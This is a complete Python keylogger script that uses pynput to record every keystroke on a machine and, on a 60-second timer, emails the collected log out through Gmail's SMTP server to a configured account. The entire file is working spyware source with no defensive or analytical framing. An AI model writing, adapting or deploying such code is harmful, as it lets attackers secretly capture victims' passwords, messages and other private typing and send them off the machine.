import pynput.keyboard
import threading
import smtplib

# Creating keylogger class
class Keylogger:
    # Declaring keylogger variables
    def __init__(self, time_interval: int, email: object, password: object):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    # Add information to send through email
    def append_to_log(self, string):
        self.log = self.log + string

    # Processing keys
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # Sending email with informations
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Starting keylogger
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Initializing keylogger and setting email and password
my_keylogger = Keylogger(60, "email@gmail.com", "password")
my_keylogger.start()